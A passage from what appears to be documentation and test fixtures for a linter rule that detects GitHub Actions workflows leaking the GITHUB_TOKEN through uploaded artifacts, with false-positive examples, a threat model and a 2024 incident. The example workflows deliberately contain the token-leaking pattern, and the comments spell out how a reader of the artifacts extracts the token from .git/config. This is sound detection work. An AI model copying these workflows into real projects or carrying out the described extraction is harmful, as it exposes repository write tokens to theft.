          - uses: actions/checkout@v4
            with:
              token: ${{ secrets.PAT }}
          - run: git config --unset-all http.https://github.com/.extraheader
          - uses: actions/upload-artifact@v4
            with:
              path: .
              include-hidden-files: true
    ```
- fork-pull-request: pull_request from a fork, whose token is read whatever permissions say, unless a private repository sends a token that writes to the runs of pull requests from forks: the rule reads permissions only
  - finding kinds: artipacked.github-token
  - disposition: todo (needs: same-file, fact)
  - example: fork-pull-request.yml (workflow, false-positive)
    ```yaml
    # situation: the job runs only for a pull request from a fork, and uploads
    #   the workspace with the token in .git/config.
    # reason: the token of a pull request from a fork is read whatever
    #   permissions say, so the token in the artifact writes nothing.
    # cause: the rule reads permissions only (and only github.event_name and
    #   github.event.action of an if).
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API while the job still
    #   runs, and takes the token from the line
    #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
    #   of x-access-token:<token>) of .git/config.
    # attack-run-behavior: the job runs only for a fork's pull request, whose
    #   GITHUB_TOKEN is read whatever permissions says; the reader takes it from
    #   the artifact's .git/config, and it pushes nothing.
    on: pull_request
    jobs:
      a:
        if: github.event.pull_request.head.repo.fork
        runs-on: ubuntu-latest
        permissions:
          contents: write
        steps:
          - uses: actions/checkout@v4
          - uses: actions/upload-artifact@v4
            with:
              path: .
              include-hidden-files: true
          - run: echo after the upload
    ```
- unknown-version: a ref whose version is not known (@main) of actions/checkout or actions/upload-artifact, read in the worst case: the main of actions/checkout now keeps the token out of .git/config
  - finding kinds: artipacked.github-token, artipacked.token-input
  - disposition: todo (needs: fact)
  - example: unknown-version.yml (workflow, false-positive)
    ```yaml
    # situation: the job checks out the repository with actions/checkout@main
    #   and uploads the workspace.
    # reason: the main of actions/checkout keeps the token out of .git/config,
    #   so the upload takes no token.
    # cause: the version of @main is not known, so it is read in the worst case.
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API while the job still
    #   runs, and takes the token from the line
    #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
    #   of x-access-token:<token>) of .git/config.
    # attack-run-behavior: the main of actions/checkout keeps the credential out
    #   of .git/config, so the artifact's .git/config holds no token, and the
    #   reader takes none.
    on: push
    jobs:
      a:
        runs-on: ubuntu-latest
        permissions:
          contents: write
        steps:
          - uses: actions/checkout@main
          - uses: actions/upload-artifact@main
            with:
              path: .
              include-hidden-files: true
          - run: echo after the upload
    ```
- default-token-read: a job that writes no permissions, in a repository whose default token is read
  - finding kinds: artipacked.github-token
  - fact kinds:
    - repo.default-token-write (provider: repo-setting, answer that removes the finding: false)
  - example: default-token-read.yml (workflow, false-positive)
    ```yaml
    # situation: the job writes no permissions, checks out the repository and
    #   uploads the workspace with its hidden files, .git/config with the token
    #   among them.
    # reason: the repository's default token is read, so the token in the
    #   artifact writes nothing.
    # cause: unless a file of facts or --fact says that the default token is read
    #   (repo.default-token-write false), the rule treats the default token as a
    #   token that may write and reports the finding. When no source answers
    #   repo.default-token-write, the finding is conditional.
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API while the job still
    #   runs, and takes the token from the line
    #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
    #   of x-access-token:<token>) of .git/config.
    # attack-run-behavior: the artifact's .git/config holds the job's token, the
    #   repository's default, which is read, so with it the reader can read the
    #   repository but push nothing.
    on: push
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - uses: actions/upload-artifact@v4
            with:
              path: .
              include-hidden-files: true
          - run: echo after the upload
    ```
- actions-not-allowed: a workflow whose run GitHub does not start, or a job that GitHub fails in the step "Set up job", because of the setting of allowed actions of GitHub (the fact repo.allowed-actions, which the quality rule allowed-actions reads): GitHub does not start a run of a workflow that has a uses, or that calls a reusable workflow that has a uses, that the setting does not allow, and fails a job before any step of the job runs when a step of a composite action that the job runs has a uses that the setting does not allow, or when the setting requires a full commit SHA and a step names an action by a tag or a branch. The harm that the finding reports happens only when GitHub runs the workflow or the job, and the rule does not read repo.allowed-actions
  - finding kinds: artipacked.github-token, artipacked.token-input
  - disposition: todo (needs: fact)
  - example: actions-not-allowed.yml (workflow, false-positive)
    ```yaml
    # situation: the workflow of the true positive github-token
    #   (github-token.yml) of the rule, with a job added whose step uses
    #   example-org/not-allowed-action, which the setting of allowed actions of
    #   GitHub (repo.allowed-actions) blocks with
    #   !example-org/not-allowed-action@*. In the true positive,
    #   actions/checkout leaves the job's token in .git/config,
    #   actions/upload-artifact uploads the workspace with its hidden files, and
    #   a step runs after it.
    # reason: GitHub checks each uses of the workflow before the run starts, and
    #   does not start the run because of the uses of
    #   example-org/not-allowed-action: no job of the run runs, so what the
    #   reason of the true positive says does not happen (in runs that the
    #   authors of the rule made on GitHub, such runs ended as startup_failure).
    # cause: the rule does not read repo.allowed-actions.
    # attack: a reader of the repository's artifacts (anyone, in a public
    #   repository) downloads the artifact through the API while the job still
    #   runs, and takes the token from the line
    #   http.https://github.com/.extraheader (AUTHORIZATION: basic, the base64
    #   of x-access-token:<token>) of .git/config.
    # attack-run-behavior: GitHub does not start the run, so no step of the run
    #   runs, and the attack does nothing.
    on: push
    jobs:
      a:
        runs-on: ubuntu-latest
        permissions:
          contents: write
        steps:
          - uses: actions/checkout@v4
          - uses: actions/upload-artifact@v4
            with:
              path: .
              include-hidden-files: true
          - run: echo after the upload
      not-allowed:
        runs-on: ubuntu-latest
        steps:
          - uses: example-org/not-allowed-action@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

### threat

- precondition leaves-git-credential: a step leaves a git credential in a file: in .git/config of the workspace, actions/checkout v1 to v5 without persist-credentials false, or JamesIves/github-pages-deploy-action without ssh-key; in git-credentials-&lt;uuid>.config of RUNNER_TEMP, actions/checkout v6 and later without persist-credentials false, until its post step at the end of the job removes the file. The upload takes the file: for .git/config, hidden files taken (actions/upload-artifact v4 before v4.4.0, v3 before v3.2.0, or include-hidden-files true), or the path names .git/config; for the file of RUNNER_TEMP, a line of path that starts with \${{ runner.temp }} and includes the file, git-credentials-&lt;uuid>.config, whose name does not start with a dot
  - observed: 2026-09-30, runner 2.337.0: an upload of actions/upload-artifact v4.3.6 with path ., and of v4 with include-hidden-files true and path ., \* or \*\* after actions/checkout v4, had .git/config; one of v4 with path . alone did not, and one with path .git/config did
  - cites:
    - <https://github.com/actions/upload-artifact/releases/tag/v4.4.0>
    - <https://github.com/actions/checkout/releases/tag/v6.0.0>
- precondition artifact-taken: anyone signed in with read access to the repository downloads the artifacts of its runs, on a public repository anyone with an account; from actions/upload-artifact v4 an artifact is there as soon as it is uploaded, before the run ends
  - cites:
    - <https://docs.github.com/en/actions/how-tos/manage-workflow-runs/download-workflow-artifacts>
- precondition token-writes: the GITHUB_TOKEN works until the job ends, and the artifact is there before (v4 on): the steps and the post steps after the upload leave the time, even when it is the last step; the token may write: a scope other than id-token written write, or no permissions written and the repository's default writes (repo.default-token-write true)
  - observed: 2026-09-30, runner 2.337.0: a token read from .git/config of an artifact downloaded while its job still ran read the private repository then, and was refused after the run
  - cites:
    - <https://docs.github.com/en/actions/concepts/security/github_token>
- actor: artifact-reader
  - via: downloads the artifact of a run and reads the credential in it
  - gains: read-secrets, write-with-token
- incident artipacked-2024: 2024-08-13: artifacts of public projects had .git/config with the GITHUB_TOKEN of actions/checkout; the researcher took one while the job still ran and created a branch of quay/clair with it; the report does not name the workflow; the one quay/clair fixed after it uploaded the workspace as the job's last step, after actions/cache whose post step saves the cache
  - advisory: <https://unit42.paloaltonetworks.com/github-repo-artifacts-leak-tokens/>
  - compromised: quay/clair
